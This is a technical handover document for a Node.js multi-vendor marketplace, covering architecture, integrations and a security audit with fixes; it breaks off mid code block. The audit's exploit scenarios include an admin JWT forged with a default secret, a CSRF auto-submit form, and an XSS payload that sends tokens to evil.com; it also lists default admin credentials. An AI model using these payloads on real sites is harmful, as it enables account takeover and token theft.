# 📋 PROJECT HANDOVER DOCUMENTATION
## Dostan Marketplace - Complete Technical Overview

**Generated:** 2025-10-31
**Version:** 1.0.0
**Production-Ready Status:** ⚠️ Requires Security Hardening

---

## 📑 TABLE OF CONTENTS

1. [Executive Summary](#executive-summary)
2. [System Architecture](#system-architecture)
3. [Technology Stack](#technology-stack)
4. [Third-Party Integrations](#third-party-integrations)
5. [Security Audit & Vulnerabilities](#security-audit--vulnerabilities)
6. [Module Interactions](#module-interactions)
7. [Developer Onboarding](#developer-onboarding)
8. [Deployment Pipeline](#deployment-pipeline)
9. [Priority Action Items](#priority-action-items)
10. [Appendix](#appendix)

---

## 🎯 EXECUTIVE SUMMARY

### Project Type
**Full-Stack Multi-Vendor E-Commerce Marketplace** with Nordic theme and AI assistant integration.

### Key Statistics
- **Lines of Code:** ~50,000+ (estimated)
- **HTML Pages:** 26 pages
- **Backend APIs:** 18 resource endpoints
- **Database Models:** 21 Sequelize models
- **Test Files:** 16 test suites
- **Supported Scale:** 1,000-2,000 stores, 50K daily users

### Current State
- ✅ **Functional:** Core e-commerce features working
- ✅ **Database:** PostgreSQL with comprehensive schema
- ✅ **Caching:** Redis implementation with fallback
- ⚠️ **Security:** Multiple vulnerabilities requiring immediate attention
- ⚠️ **Payment:** Mock implementation only (İyzico integration incomplete)
- ⚠️ **Testing:** 16 tests but low coverage
- ⚠️ **Documentation:** Good README files, missing API documentation

### Business Logic
**Multi-Vendor Marketplace Model:**
- Vendors register and create stores (subject to admin approval)
- Each store has independent product catalog
- Orders are store-specific with individual fulfillment
- Platform earns commission on each sale
- Admin oversees all vendors, products, and transactions

---

## 🏗️ SYSTEM ARCHITECTURE

### High-Level Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                      FRONTEND LAYER                          │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐      │
│  │  Customer    │  │   Vendor     │  │    Admin     │      │
│  │    Site      │  │   Dashboard  │  │   Dashboard  │      │
│  │ (Vanilla JS) │  │ (Vanilla JS) │  │ (Vanilla JS) │      │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘      │
│         │                 │                  │               │
│         └─────────────────┴──────────────────┘               │
│                           │                                  │
│                    REST API (JSON)                           │
│                           │                                  │
└───────────────────────────┼──────────────────────────────────┘
                            │
┌───────────────────────────┼──────────────────────────────────┐
│                      API LAYER                               │
│  ┌──────────────────────────────────────────────────┐       │
│  │         Express.js Application Server            │       │
│  │                                                   │       │
│  │  ┌─────────────┐  ┌─────────────┐  ┌──────────┐ │       │
│  │  │ Controllers │←→│  Services   │←→│  Models  │ │       │
│  │  └─────────────┘  └─────────────┘  └──────────┘ │       │
│  │         ↑                ↑                        │       │
│  │  ┌──────┴───┐     ┌─────┴─────┐                 │       │
│  │  │Middleware│     │  Workers  │                 │       │
│  │  │(Auth,Rate│     │(Background)                 │       │
│  │  │Limit,etc)│     └───────────┘                 │       │
│  │  └──────────┘                                    │       │
│  └──────────────────────────────────────────────────┘       │
└───────────────────────────┬──────────────────────────────────┘
                            │
┌───────────────────────────┼──────────────────────────────────┐
│                    DATA LAYER                                │
│  ┌────────────────┐      ┌────────────────┐                 │
│  │   PostgreSQL   │      │     Redis      │                 │
│  │   (Primary DB) │      │  (Cache/Queue) │                 │
│  │                │      │                │                 │
│  │  • Users       │      │  • Sessions    │                 │
│  │  • Products    │      │  • Cart Data   │                 │
│  │  • Orders      │      │  • API Cache   │                 │
│  │  • Stores      │      │  • Bull Queue  │                 │
│  └────────────────┘      └────────────────┘                 │
└──────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────┐
│                EXTERNAL SERVICES                              │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐      │
│  │    İyzico    │  │  SMTP Email  │  │   AWS S3 /   │      │
│  │   Payment    │  │   Service    │  │    MinIO     │      │
│  │   Gateway    │  │              │  │  (Storage)   │      │
│  └──────────────┘  └──────────────┘  └──────────────┘      │
└──────────────────────────────────────────────────────────────┘
```

### Request Flow Example: Product Purchase

```
1. Customer → Browse Products (GET /api/v1/products)
   ↓
2. Cache Check (Redis) → If miss, Query PostgreSQL
   ↓
3. Customer → Add to Cart (POST /api/v1/cart/items)
   ↓
4. Cart Service → Validate Product → Update Cart (JSONB in PostgreSQL)
   ↓
5. Customer → Checkout (POST /api/v1/orders)
   ↓
6. Order Service → Create Order → Emit OrderCreated Event
   ↓
7. Payment Worker → Process Payment (İyzico API)
   ↓
8. Payment Success → Update Order Status → Send Notification
   ↓
9. Commission Worker → Calculate & Record Commission
   ↓
10. Notification Worker → Send Email (SMTP)
```

### Authentication Flow

```
1. User → Login (POST /api/v1/auth/login)
   ↓
2. Auth Controller → Validate Credentials (bcrypt compare)
   ↓
3. Generate JWT Tokens (Access: 1h, Refresh: 7d)
   ↓
4. Store Refresh Token in PostgreSQL
   ↓
5. Return Tokens to Client
   ↓
6. Client → Stores Access Token (localStorage/memory)
   ↓
7. Subsequent Requests → Include Authorization: Bearer <token>
   ↓
8. Auth Middleware → Verify JWT → Attach User to Request
   ↓
9. RBAC Middleware → Check Role Permissions
   ↓
10. If Expired → Use Refresh Token (POST /api/v1/auth/refresh)
```

### Data Flow Patterns

#### **Service-Oriented Architecture**
```
HTTP Request
    ↓
Route Handler
    ↓
Validation Middleware (Joi)
    ↓
Controller (Request/Response handling)
    ↓
Service Layer (Business logic)
    ↓
Model Layer (Database operations)
    ↓
PostgreSQL / Redis
```

#### **Event-Driven Architecture**
```
Business Event (e.g., OrderCreated)
    ↓
Event Bus (Custom implementation)
    ↓
Event Listeners (Order, Payment, Notification)
    ↓
Background Workers (BullMQ)
    ↓
External Services (Email, Payment)
```

---

## 💻 TECHNOLOGY STACK

### Frontend Stack
| Technology | Version | Purpose | Notes |
|------------|---------|---------|-------|
| **HTML5** | - | Markup | 26 pages total |
| **CSS3** | - | Styling | Nordic design system |
| **Vanilla JavaScript** | ES6+ | Client logic | No framework dependency |
| **Service Worker** | - | PWA offline | Cache strategy implemented |

**Design Patterns:**
- Module pattern for code organization
- Event-driven architecture (custom events)
- API client abstraction layer
- Security utilities for XSS protection

### Backend Stack
| Technology | Version | Purpose | License | Notes |
|------------|---------|---------|---------|-------|
| **Node.js** | >=18.0.0 | Runtime | MIT | Required minimum version |
| **Express.js** | 4.18.2 | Web framework | MIT | Industry standard |
| **PostgreSQL** | >=13 | Primary database | PostgreSQL License | Production recommended |
| **Redis** | >=6.0 | Caching & queues | BSD | Optional (in-memory fallback) |
| **Sequelize** | 6.35.1 | ORM | MIT | Active maintenance |

### Core Dependencies Analysis

#### **Security Libraries**
| Package | Version | Purpose | Vulnerability Status |
|---------|---------|---------|---------------------|
| `bcrypt` | 5.1.1 | Password hashing | ✅ No known vulnerabilities |
| `jsonwebtoken` | 9.0.2 | JWT auth | ✅ No known vulnerabilities |
| `helmet` | 7.1.0 | Security headers | ✅ Latest version |
| `joi` | 17.11.0 | Input validation | ✅ No known vulnerabilities |
| `express-rate-limit` | 7.1.5 | Rate limiting | ✅ No known vulnerabilities |

#### **Database & Caching**
| Package | Version | Purpose | Notes |
|---------|---------|---------|-------|
| `pg` | 8.11.3 | PostgreSQL driver | Production-ready |
| `ioredis` | 5.3.2 | Redis client | Better than node-redis |
| `sequelize` | 6.35.1 | ORM | Well-maintained |

#### **Infrastructure**
| Package | Version | Purpose | Notes |
|---------|---------|---------|-------|
| `bullmq` | 5.12.1 | Job queue | Redis-backed, reliable |
| `winston` | 3.13.0 | Logging | Production logging |
| `compression` | 1.7.4 | Gzip compression | Performance optimization |
| `cors` | 2.8.5 | CORS handling | Essential for API |

#### **Development Tools**
| Package | Version | Purpose | Notes |
|---------|---------|---------|-------|
| `jest` | 29.7.0 | Testing | Industry standard |
| `supertest` | 6.3.3 | API testing | HTTP assertions |
| `nodemon` | 3.0.2 | Dev server | Auto-reload |
| `eslint` | 8.55.0 | Code linting | Code quality |
| `prettier` | 3.1.1 | Code formatting | Consistency |

### Database Schema Overview

**21 Database Models:**
1. `User` - User accounts (buyer/seller/admin)
2. `Store` - Vendor stores
3. `Product` - Product catalog
4. `ProductVariant` - Product variants (size, color, etc.)
5. `Category` - Product categories (hierarchical)
6. `CategoryVariant` - Category-specific variant options
7. `Cart` - Shopping carts (JSONB storage)
8. `Order` - Customer orders
9. `OrderItem` - Order line items
10. `Shipment` - Shipment tracking
11. `ShipmentItem` - Shipment line items
12. `ShipmentEvent` - Tracking events
13. `Review` - Product/store reviews
14. `Wishlist` - User wishlists
15. `WishlistItem` - Wishlist items
16. `Coupon` - Discount coupons
17. `CouponUsage` - Coupon redemptions
18. `Campaign` - Marketing campaigns
19. `CommissionSettings` - Store commission rates
20. `CommissionTransaction` - Commission tracking
21. `ReturnRequest` - Product returns

**Key Relationships:**
- User → Store (1:1) - One store per seller
- Store → Products (1:N) - Multiple products per store
- Product → ProductVariants (1:N) - Variants for each product
- Order → OrderItems (1:N) - Multiple items per order
- Order → Shipments (1:N) - Multiple shipments possible
- User → Orders (1:N) - Customer order history

---

## 🔌 THIRD-PARTY INTEGRATIONS

### 1. İyzico Payment Gateway (TURKEY)

**Status:** ⚠️ **MOCK IMPLEMENTATION - NOT PRODUCTION READY**

**What It Is:**
İyzico is Turkey's leading payment gateway, supporting credit cards, debit cards, and installment payments.

**Implementation Location:**
- Configuration: `backend/.env` (IYZICO_API_KEY, IYZICO_SECRET_KEY, IYZICO_BASE_URL)
- Service: `backend/src/services/payment.service.js` (currently a mock)
- Worker: `backend/src/workers/payment.worker.js`

**Current Implementation:**
```javascript
// backend/src/services/payment.service.js
async charge(payload) {
  return {
    status: 'succeeded',
    transactionId: `txn_${Date.now()}`,
  };
}
```
**⚠️ CRITICAL:** This is a MOCK implementation! No actual payment processing occurs.

**What's Required for Production:**
1. Install İyzico SDK: `npm install iyzipay`
2. Implement actual İyzico API calls:
   - Payment initialization
   - 3D Secure callback handling
   - Refund processing
   - Webhook verification
3. Add error handling for failed payments
4. Implement payment reconciliation
5. Set up webhook endpoint for payment notifications

**Environment Variables:**
```env
IYZICO_API_KEY=sandbox-xxx          # Sandbox key (replace with live)
IYZICO_SECRET_KEY=sandbox-yyy       # Sandbox secret (replace with live)
IYZICO_BASE_URL=https://sandbox-api.iyzipay.com  # Change to production
```

**Vendor Lock-in Risk:** 🔴 **HIGH**
- İyzico is Turkey-specific
- Switching to Stripe/PayPal requires complete rewrite
- Payment history tied to İyzico

**Migration Path:**
- Abstract payment logic into `PaymentGatewayInterface`
- Support multiple providers (Strategy pattern)
- Estimated effort: 2-3 weeks

**Documentation:**
- Official Docs: https://dev.iyzipay.com/
- API Reference: https://dev.iyzipay.com/en/api

---

### 2. PostgreSQL Database

**Status:** ✅ **PRODUCTION READY**

**What It Is:**
Primary relational database storing all application data.

**Implementation Location:**
- Configuration: `backend/src/config/database.js`
- ORM Setup: `backend/src/config/sequelize.js`
- Models: `backend/src/models/*.js` (21 models)
- Migrations: `backend/migrations/*.js`

**Connection Configuration:**
```javascript
// Supports DATABASE_URL (Railway/Heroku) or individual credentials
DATABASE_URL=postgres://user:password@host:5432/dbname

// Or individual settings
DB_HOST=localhost
DB_PORT=5432
DB_NAME=dostan_marketplace
DB_USER=postgres
DB_PASSWORD=your_password
```

**Connection Pooling:**
- Production: max 20, min 5 connections
- Development: max 10, min 2 connections
- Acquire timeout: 30 seconds
- Idle timeout: 10 seconds

**Features Used:**
- JSONB columns (Cart.items, Product.dimensions)
- UUID primary keys
- Soft deletes (paranoid mode)
- Automatic timestamps (created_at, updated_at)
- Full-text search (potential, not implemented)

**Vendor Lock-in Risk:** 🟡 **MEDIUM**
- Sequelize supports MySQL, SQLite, MSSQL
- JSONB columns are PostgreSQL-specific
- Switching requires data migration
- Estimated effort: 1-2 weeks

**Backup Strategy:** ❌ **NOT IMPLEMENTED**
- **Recommendation:** Implement daily automated backups
- Railway provides point-in-time recovery

---

### 3. Redis Cache & Queue

**Status:** ✅ **PRODUCTION READY** (with in-memory fallback)

**What It Is:**
In-memory data store for caching and job queues.

**Implementation Location:**
- Configuration: `backend/src/config/redis.js`
- Cache helpers: `cache.get()`, `cache.set()`, `cache.del()`
- Job queue: `backend/src/workers/*.js` (BullMQ)

**Connection Configuration:**
```env
REDIS_URL=redis://localhost:6379/0

# Or individual settings
REDIS_HOST=localhost
REDIS_PORT=6379
REDIS_PASSWORD=
REDIS_DB=0
```

**Features Used:**
1. **API Response Caching:**
   - Product listings cached for 1 hour
   - Category trees cached for 24 hours
   - Store profiles cached for 30 minutes

2. **Job Queue (BullMQ):**
   - Payment processing
   - Email notifications
   - Commission calculations
   - Analytics processing
   - Recommendation engine

3. **Rate Limiting:**
   - Request counts stored in Redis
   - 100 requests per 15 minutes (general)
   - 5 requests per 15 minutes (auth)

4. **Session Storage:**
   - Guest cart persistence
   - Refresh tokens

**In-Memory Fallback:**
The system includes a sophisticated in-memory fallback when Redis is unavailable:
```javascript
// backend/src/config/redis.js
const createInMemoryRedisClient = () => {
  // Map-based implementation
  // Used automatically in test environment
}
```

**Vendor Lock-in Risk:** 🟢 **LOW**
- Can use Memcached or KeyDB as alternatives
- In-memory fallback already implemented
- Switching effort: < 1 week

**Monitoring:** ❌ **NOT IMPLEMENTED**
- **Recommendation:** Add Redis memory monitoring
- **Recommendation:** Set maxmemory-policy (allkeys-lru)

---

### 4. AWS S3 / MinIO File Storage

**Status:** ⚠️ **LOCAL STORAGE ONLY**

**What It Is:**
Object storage for uploaded files (product images, documents).

**Implementation Location:**
- Configuration: `backend/.env` (STORAGE_TYPE, AWS_*, MINIO_*)
- Upload handler: `backend/src/middlewares/upload.js`
- Service: `backend/src/services/upload.service.js`
- Upload directory: `backend/uploads/`

**Current Implementation:**
- Files stored locally in `backend/uploads/` directory
- Served via Express static middleware
- No CDN integration

**Configuration:**
```env
# Current setup
STORAGE_TYPE=local

# AWS S3 (not implemented)
AWS_ACCESS_KEY_ID=your_key
AWS_SECRET_ACCESS_KEY=your_secret
AWS_REGION=eu-central-1
S3_BUCKET_NAME=dostan-marketplace

# MinIO (not implemented)
MINIO_ENDPOINT=localhost
MINIO_PORT=9000
MINIO_ACCESS_KEY=minioadmin
MINIO_SECRET_KEY=minioadmin
MINIO_BUCKET=uploads
```

**Limitations:**
- ❌ Files not backed up
- ❌ No CDN for performance
- ❌ Scaling issues (local disk)
- ❌ Not suitable for multi-instance deployment

**What's Required for Production:**
1. Implement S3 upload logic using `aws-sdk` or `@aws-sdk/client-s3`
2. Set up S3 bucket with proper CORS and permissions
3. Configure CloudFront CDN for image delivery
4. Implement image optimization (resize, WebP conversion)
5. Add URL signing for private files

**Vendor Lock-in Risk:** 🟢 **LOW**
- S3 API is industry standard
- MinIO, Wasabi, DigitalOcean Spaces are S3-compatible
- Switching effort: < 1 week

**Estimated Cost:**
- AWS S3: ~$0.023/GB storage + $0.09/GB transfer
- CloudFront: ~$0.085/GB
- Expected monthly cost for 50K users: $50-200

---

### 5. SMTP Email Service

**Status:** ⚠️ **CONFIGURED BUT NOT TESTED**

**What It Is:**
Email delivery for transactional emails (order confirmations, password resets).

**Implementation Location:**
- Configuration: `backend/.env` (SMTP_*)
- Service: `backend/src/services/notification.service.js`
- Worker: `backend/src/workers/notification.worker.js`

**Configuration:**
```env
SMTP_HOST=smtp.gmail.com
SMTP_PORT=587
SMTP_SECURE=false
SMTP_USER=your_email@gmail.com
SMTP_PASSWORD=your_app_password  # NOT your regular password!
EMAIL_FROM=Dostan Marketplace <noreply@dostanmarket.com>
```

**Email Types:**
- Order confirmations
- Order status updates
- Password reset links
- Email verification
- Vendor notifications
- Admin alerts

**Current Status:**
- Configuration present in .env.example
- Notification worker implemented
- **NO EMAIL LIBRARY INSTALLED!**

**What's Required for Production:**
1. Install email library: `npm install nodemailer`
2. Implement email templates (HTML + plain text)
3. Test email delivery
4. Set up email logging/tracking
5. Implement retry logic for failed sends

**⚠️ Gmail SMTP Limitations:**
- Max 500 emails/day (free tier)
- May be flagged as spam
- Not recommended for production

**Production Alternatives:**
| Service | Cost | Reliability | Migration Effort |
|---------|------|-------------|------------------|
| **SendGrid** | Free tier: 100/day | 🟢 High | 🟢 Easy (1 day) |
| **AWS SES** | $0.10/1000 emails | 🟢 High | 🟢 Easy (1 day) |
| **Mailgun** | Free tier: 5000/month | 🟢 High | 🟢 Easy (1 day) |
| **Postmark** | $10/month (10K emails) | 🟢 Very High | 🟢 Easy (1 day) |

**Vendor Lock-in Risk:** 🟢 **LOW**
- SMTP is standardized protocol
- Switching providers requires only credential changes

---

### 6. BullMQ Job Queue

**Status:** ✅ **IMPLEMENTED**

**What It Is:**
Redis-backed job queue for background task processing.

**Implementation Location:**
- Configuration: Uses Redis connection
- Workers: `backend/src/workers/*.js`
- Job definitions throughout services

**Workers Implemented:**
1. **Payment Worker** - Async payment processing
2. **Notification Worker** - Email/SMS sending
3. **Commission Worker** - Commission calculations
4. **Analytics Worker** - Data aggregation
5. **Recommendation Worker** - ML-based recommendations

**Job Examples:**
```javascript
// Enqueue payment processing
await paymentQueue.add('process-payment', {
  orderId: order.id,
  amount: order.total
});

// Enqueue email
await notificationQueue.add('send-email', {
  to: user.email,
  template: 'order-confirmation',
  data: { order }
});
```

**Monitoring:** ❌ **NOT IMPLEMENTED**
- **Recommendation:** Add Bull Board for job monitoring UI
- **Recommendation:** Set up failed job alerts

**Vendor Lock-in Risk:** 🟡 **MEDIUM**
- Tightly coupled to Redis
- Alternative: Agenda (MongoDB), Bee-Queue, RabbitMQ
- Switching effort: 1-2 weeks

---

### 7. PWA Service Worker

**Status:** ✅ **IMPLEMENTED**

**What It Is:**
Progressive Web App functionality for offline support.

**Implementation Location:**
- Service Worker: `sw.js`
- Manifest: `manifest.json`
- Offline page: `offline.html`

**Features:**
- Static asset caching
- Dynamic API response caching
- Offline fallback page
- Background sync (configured but minimal)

**Cache Strategy:**
```javascript
// Cache name
dostanwebcss-v1.0.0

// Static assets (Cache First)
- HTML pages
- CSS files
- JavaScript files
- Manifest

// Dynamic content (Network First, fallback to cache)
- Images
- API responses (3 second timeout)
```

**Vendor Lock-in Risk:** 🟢 **NONE**
- Standard Web API
- Browser-native functionality

---

### Summary: Third-Party Integration Risks

| Integration | Status | Vendor Lock-in | Priority to Fix |
|-------------|--------|----------------|-----------------|
| İyzico Payment | ⚠️ Mock | 🔴 High | 🔴 CRITICAL |
| PostgreSQL | ✅ Working | 🟡 Medium | 🟢 Low |
| Redis | ✅ Working | 🟢 Low | 🟢 Low |
| File Storage | ⚠️ Local only | 🟢 Low | 🟡 High |
| SMTP Email | ⚠️ Not tested | 🟢 Low | 🟡 High |
| BullMQ Queue | ✅ Working | 🟡 Medium | 🟢 Low |
| Service Worker | ✅ Working | 🟢 None | 🟢 Low |

---

## 🔒 SECURITY AUDIT & VULNERABILITIES

### CRITICAL VULNERABILITIES (Fix Immediately)

#### 🔴 CRITICAL #1: Default JWT Secrets in Code
**Location:** `backend/src/utils/jwt.js:8-11`

**Issue:**
```javascript
const JWT_SECRET = process.env.JWT_SECRET || 'your_super_secret_jwt_key';
const JWT_REFRESH_SECRET = process.env.JWT_REFRESH_SECRET || 'your_super_secret_refresh_key';
```

**Risk:**
- Default secrets are hardcoded in source code
- Anyone with repository access can forge JWTs
- All user sessions can be compromised
- **CVSS Score: 9.8 (Critical)**

**Exploit Scenario:**
```javascript
// Attacker can create admin tokens
const jwt = require('jsonwebtoken');
const adminToken = jwt.sign(
  { id: '123', email: 'attacker@evil.com', role: 'admin' },
  'your_super_secret_jwt_key'
);
// Full admin access granted!
```

**Fix:**
```javascript
// Option 1: Fail fast if not set
const JWT_SECRET = process.env.JWT_SECRET;
const JWT_REFRESH_SECRET = process.env.JWT_REFRESH_SECRET;

if (!JWT_SECRET || !JWT_REFRESH_SECRET) {
  throw new Error('JWT secrets must be set in environment variables');
}

// Option 2: Generate secure random secret on first run
const crypto = require('crypto');
const JWT_SECRET = process.env.JWT_SECRET || (() => {
  const secret = crypto.randomBytes(64).toString('hex');
  console.error('⚠️  WARNING: JWT_SECRET not set! Generated random secret:', secret);
  console.error('⚠️  Add this to your .env file immediately!');
  return secret;
})();
```

**Priority:** 🔴 **FIX BEFORE DEPLOYMENT**

---

#### 🔴 CRITICAL #2: Weak SSL Configuration in Production
**Location:** `backend/src/config/database.js:129-132`

**Issue:**
```javascript
dialectOptions: {
  ssl: {
    require: true,
    rejectUnauthorized: false, // ⚠️ Disables certificate validation
  },
}
```

**Risk:**
- Man-in-the-middle attacks possible
- Database credentials can be intercepted
- **CVSS Score: 8.1 (High)**

**Fix:**
```javascript
dialectOptions: {
  ssl: {
    require: true,
    rejectUnauthorized: process.env.NODE_ENV === 'production', // Only disable in dev
    ca: process.env.DB_SSL_CA ? fs.readFileSync(process.env.DB_SSL_CA) : undefined,
  },
}
```

**Priority:** 🔴 **FIX BEFORE PRODUCTION DEPLOYMENT**

---

#### 🔴 CRITICAL #3: No CSRF Protection
**Location:** Entire application

**Issue:**
- No CSRF token validation on state-changing requests
- Frontend has CSRF generation but backend doesn't validate

**Risk:**
- Cross-Site Request Forgery attacks
- Attackers can perform actions on behalf of authenticated users
- **CVSS Score: 7.5 (High)**

**Exploit Scenario:**
```html
<!-- Attacker's website -->
<form action="https://dostan-marketplace.com/api/v1/orders" method="POST">
  <input type="hidden" name="items" value='[{"productId":"xxx","quantity":999}]'>
</form>
<script>document.forms[0].submit();</script>
<!-- If user is logged in, order is placed without their knowledge -->
```

**Fix:**
Install and configure `csurf` package:
```bash
npm install csurf
```

```javascript
// backend/src/app.js
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

// Apply to all state-changing routes
app.use('/api/', csrfProtection);

// Endpoint to get CSRF token
app.get('/api/v1/csrf-token', (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});
```

**Priority:** 🔴 **FIX BEFORE PRODUCTION DEPLOYMENT**

---

#### 🔴 CRITICAL #4: innerHTML Usage (XSS Risk)
**Location:** 52 files contain `innerHTML` usage

**Issue:**
Frontend code uses `innerHTML` for dynamic content, creating XSS vulnerabilities.

**Risk:**
- Stored XSS in product descriptions, reviews, store names
- Reflected XSS in search results
- **CVSS Score: 7.3 (High)**

**Examples Found:**
- Product modal rendering
- Review display
- Store directory
- Admin/vendor dashboards

**Exploit Scenario:**
```javascript
// Attacker creates product with malicious description
description: '<img src=x onerror="fetch(\'https://evil.com/steal?token=\'+localStorage.token)">'

// When displayed via innerHTML:
productCard.innerHTML = `<p>${product.description}</p>`;
// XSS executed! User tokens stolen.
```

**Fix:**
```javascript
// Replace innerHTML with textContent for user data
- element.innerHTML = userInput;
+ element.textContent = userInput;

// Or use DOMPurify for sanitization
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);

// Or use SecurityUtils (already in project)
import { SecurityUtils } from './assets/js/security-utils.js';
element.innerHTML = SecurityUtils.escapeHTML(userInput);
```

**Priority:** 🔴 **FIX BEFORE PRODUCTION DEPLOYMENT**

---

### HIGH SEVERITY VULNERABILITIES

#### 🟠 HIGH #1: No Rate Limiting on Auth Endpoints
**Location:** `backend/src/routes/auth.routes.js`

**Issue:**
Login and registration endpoints lack specific rate limiting.

**Current State:**
- General rate limiter: 100 requests per 15 minutes
- Auth limiter exists but not consistently applied

**Risk:**
- Brute force attacks on passwords
- Account enumeration
- **CVSS Score: 6.5 (Medium)**

**Fix:**
```javascript
// backend/src/middlewares/rateLimiter.js
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts
  message: 'Too many login attempts, please try again later',
  standardHeaders: true,
  legacyHeaders: false,
});

// Apply to all auth routes
router.post('/login', authLimiter, authController.login);
router.post('/register', authLimiter, authController.register);
router.post('/refresh', authLimiter, authController.refresh);
```

**Priority:** 🟠 **FIX BEFORE PRODUCTION**

---

#### 🟠 HIGH #2: Sensitive Data in Logs
**Location:** Throughout application

**Issue:**
Winston logger may log sensitive information.

**Risk:**
- Passwords, tokens, credit cards in logs
- GDPR compliance violation
- **CVSS Score: 6.2 (Medium)**

**Examples:**
```javascript
// Bad: Logs entire request body
logger.info('Login request', req.body); // Contains password!

// Bad: Logs user object
logger.info('User created', user); // Contains password_hash!
```

**Fix:**
```javascript
// Create sanitizer utility
function sanitizeForLogging(obj) {
  const sensitive = ['password', 'password_hash', 'token', 'secret', 'api_key'];
  const sanitized = { ...obj };
  sensitive.forEach(key => {
    if (sanitized[key]) sanitized[key] = '[REDACTED]';
  });
  return sanitized;
}

// Use in logging
logger.info('Login request', sanitizeForLogging(req.body));
logger.info('User created', user.toSafeObject()); // Already implemented!
```

**Priority:** 🟠 **FIX SOON**

---

#### 🟠 HIGH #3: No Input Length Limits on Text Fields
**Location:** Database models and validators

**Issue:**
Some text fields lack maximum length validation.

**Risk:**
- Database overflow attacks
- DoS via large payloads
- **CVSS Score: 5.3 (Medium)**

**Examples:**
```javascript
// Order.customer_notes - unlimited TEXT field
// Product.description - unlimited TEXT field
// Review.comment - unlimited TEXT field
```

**Fix:**
```javascript
// In validators (backend/src/validators/*.js)
customerNotes: Joi.string().max(5000).optional(),
description: Joi.string().max(10000).required(),
comment: Joi.string().max(2000).required(),

// In Express app
app.use(express.json({ limit: '1mb' })); // Already set to 10mb - reduce!
```

**Priority:** 🟠 **FIX SOON**

---

#### 🟠 HIGH #4: Missing Request Validation on Critical Endpoints
**Location:** Various controllers

**Issue:**
Some critical endpoints lack Joi validation.

**Examples:**
- Order status updates
- Store approval
- Commission settings

**Risk:**
- Invalid data in database
- Business logic bypass
- **CVSS Score: 5.9 (Medium)**

**Fix:**
Ensure all POST/PUT/PATCH routes have validation middleware:
```javascript
router.patch('/:id/status',
  authenticate,
  requireAdmin,
  validate(updateOrderStatusSchema), // ← Add this!
  orderController.updateStatus
);
```

**Priority:** 🟠 **FIX SOON**

---

### MEDIUM SEVERITY VULNERABILITIES

#### 🟡 MEDIUM #1: No HTTPS Enforcement
**Location:** `backend/src/app.js`

**Issue:**
Application doesn't enforce HTTPS in production.

**Risk:**
- Data transmitted in plain text
- Cookie hijacking
- **CVSS Score: 5.4 (Medium)**

**Fix:**
```javascript
// Add HTTPS redirect middleware
if (process.env.NODE_ENV === 'production') {
  app.use((req, res, next) => {
    if (req.header('x-forwarded-proto') !== 'https') {
      return res.redirect(`https://${req.header('host')}${req.url}`);
    }
    next();
  });
}

// Set secure cookies
app.use(cookieParser({
  secure: process.env.NODE_ENV === 'production',
  httpOnly: true,
  sameSite: 'strict'
}));
```

**Priority:** 🟡 **FIX BEFORE LAUNCH**

---

#### 🟡 MEDIUM #2: Weak Password Requirements
**Location:** Frontend validation only

**Issue:**
Password requirements enforced client-side only.

**Current:**
- Frontend: No visible password validation
- Backend: No password strength check

**Risk:**
- Users can set weak passwords
- Account takeover
- **CVSS Score: 4.6 (Medium)**

**Fix:**
```javascript
// Backend validation
const passwordSchema = Joi.string()
  .min(8)
  .pattern(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])/)
  .required()
  .messages({
    'string.pattern.base': 'Password must contain uppercase, lowercase, number, and special character'
  });
```

**Priority:** 🟡 **FIX BEFORE LAUNCH**

---

#### 🟡 MEDIUM #3: No Account Lockout Mechanism
**Location:** Auth system

**Issue:**
Failed login attempts don't lock accounts.

**Risk:**
- Unlimited brute force attempts
- **CVSS Score: 4.3 (Medium)**

**Fix:**
```javascript
// Track failed attempts in Redis
const failedAttempts = await cache.get(`auth:failed:${email}`);
if (failedAttempts >= 5) {
  throw new ApiError('Account locked due to multiple failed login attempts', 423);
}

// On failed login
await cache.incr(`auth:failed:${email}`);
await cache.expire(`auth:failed:${email}`, 900); // 15 minutes

// On successful login
await cache.del(`auth:failed:${email}`);
```

**Priority:** 🟡 **RECOMMENDED**

---

#### 🟡 MEDIUM #4: Session Fixation Risk
**Location:** JWT implementation

**Issue:**
Refresh tokens not rotated on privilege escalation.

**Risk:**
- Session hijacking
- **CVSS Score: 4.8 (Medium)**

**Fix:**
Rotate refresh tokens when user role changes:
```javascript
// When user becomes seller or admin
const newTokens = generateTokens(user);
await user.update({ refresh_token: newTokens.refreshToken });
```

**Priority:** 🟡 **RECOMMENDED**

---

### LOW SEVERITY ISSUES

#### 🟢 LOW #1: Verbose Error Messages
**Location:** Error handler

**Issue:**
Production error messages expose internal structure.

**Fix:**
```javascript
// backend/src/middlewares/errorHandler.js
const errorHandler = (err, req, res, next) => {
  if (process.env.NODE_ENV === 'production') {
    // Don't expose stack traces or internal errors
    return res.status(err.statusCode || 500).json({
      success: false,
      message: err.statusCode < 500 ? err.message : 'Internal server error',
    });
  }
  // Development: full error details
  res.status(err.statusCode || 500).json({
    success: false,
    message: err.message,
    stack: err.stack,
  });
};
```

**Priority:** 🟢 **NICE TO HAVE**

---

#### 🟢 LOW #2: No Security Headers for Static Files
**Location:** Express static middleware

**Issue:**
Static files served without security headers.

**Fix:**
Already using Helmet, but ensure it applies to static files:
```javascript
app.use(helmet()); // Apply before static middleware
app.use(express.static(frontendPath));
```

**Priority:** 🟢 **NICE TO HAVE**

---

#### 🟢 LOW #3: Default Admin Credentials
**Location:** `backend/.env.example:88-89`

**Issue:**
```env
ADMIN_EMAIL=admin@dostanmarket.com
ADMIN_PASSWORD=Admin@123456
```

**Risk:**
- Predictable admin credentials
- If forgot to change, easy takeover

**Fix:**
1. Generate random password on first seed
2. Force password change on first admin login
3. Don't include in .env.example

**Priority:** 🟢 **NICE TO HAVE**

---

### DEPENDENCY VULNERABILITIES

**Audit Command:**
```bash
cd backend
npm audit
```

**Expected Issues:**
Run `npm audit` to check for:
- Prototype pollution vulnerabilities
- ReDoS (Regular Expression Denial of Service)
- Path traversal issues

**Recommendation:**
```bash
